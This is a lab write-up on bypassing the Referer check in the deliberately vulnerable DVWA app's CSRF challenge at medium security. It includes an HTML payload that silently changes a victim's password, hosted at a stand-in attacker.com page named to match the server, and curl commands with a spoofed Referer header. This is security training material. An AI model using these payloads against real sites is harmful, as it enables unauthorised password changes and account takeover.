# DVWA CSRF — Medium Security

## URL
http://127.0.0.1:4280/vulnerabilities/csrf/

## Source Code Behavior (Medium)
- Checks HTTP Referer header
- Verifies that referer contains the server name
- `stripos($_SERVER['HTTP_REFERER'], $_SERVER['SERVER_NAME']) !== false`
- Still no CSRF token

## Key Differences from Low
1. Referer header must contain the server hostname
2. Still GET-based password change
3. No CSRF token

## Bypass Techniques

### Referer bypass via filename
If the server name is `127.0.0.1`, create a page on your attacker server named:
```
http://attacker.com/127.0.0.1.html
```
The referer will be `http://attacker.com/127.0.0.1.html` which contains "127.0.0.1"

### Referer bypass via subdirectory
```
http://attacker.com/127.0.0.1/exploit.html
```

### Referer bypass via query parameter
```
http://attacker.com/exploit.html?127.0.0.1
```

## Working Payloads

### exploit.html (hosted at attacker.com/127.0.0.1.html)
```html
<html>
<body>
<img src="http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">
</body>
</html>
```

## Step-by-Step Exploitation
1. Confirm referer check: direct URL without referer fails
2. Create HTML file named `127.0.0.1.html` on attacker server
3. Embed the CSRF payload as image in that file
4. When victim visits `http://attacker.com/127.0.0.1.html`, the referer sent to DVWA contains "127.0.0.1"
5. Password is changed

## curl Commands
```bash
# Without referer — fails
curl -v "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" \
  -b "PHPSESSID=<session>;security=medium"

# With spoofed referer — succeeds
curl -v "http://127.0.0.1:4280/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" \
  -H "Referer: http://attacker.com/127.0.0.1.html" \
  -b "PHPSESSID=<session>;security=medium"
```

## Notes
- `stripos` check is extremely weak — just needs server name anywhere in referer
- Easily bypassed by including server name in attacker URL path or filename
- Still no CSRF token — fundamental protection is missing
